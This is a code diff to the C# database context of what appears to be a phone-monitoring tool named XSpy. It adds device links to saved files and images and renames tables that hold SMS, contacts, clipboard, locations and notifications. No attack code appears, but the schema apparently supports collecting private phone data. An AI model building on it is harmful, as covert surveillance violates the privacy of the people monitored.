@@ -23,6 +23,8 @@ namespace XSpy.Database
             modelBuilder.Entity<Device>().HasMany(s => s.Permissions).WithOne(s => s.DeviceData);
             modelBuilder.Entity<Device>().HasMany(s => s.Locations).WithOne(s => s.DeviceData);
             modelBuilder.Entity<Device>().HasMany(s => s.TempPaths).WithOne(s => s.DeviceData);
+            modelBuilder.Entity<Device>().HasMany(s => s.SavedFiles).WithOne(s => s.DeviceData);
+            modelBuilder.Entity<Device>().HasMany(s => s.ImageList).WithOne(s => s.DeviceData);
             modelBuilder.Entity<Rank>().HasMany(s => s.Roles).WithOne(s => s.Rank);
 
 
@@ -112,13 +114,12 @@ namespace XSpy.Database
         public DbSet<Clipboard> Clipboards { get; set; }
         public DbSet<Contact> Contacts { get; set; }
         public DbSet<File> Files { get; set; }
-        public DbSet<FileList> ListFiles { get; set; }
+        public DbSet<FileList> ImageList { get; set; }
         public DbSet<InstalledApps> InstalledApps { get; set; }
         public DbSet<Location> Locations { get; set; }
         public DbSet<Notification> Notifications { get; set; }
         public DbSet<Permission> Permissions { get; set; }
-        public DbSet<Sms> SmsList { get; set; }
         public DbSet<Wifi> WifiList { get; set; }
-        public DbSet<Device> Messages { get; set; }
+        public DbSet<Sms> Messages { get; set; }
     }
 }
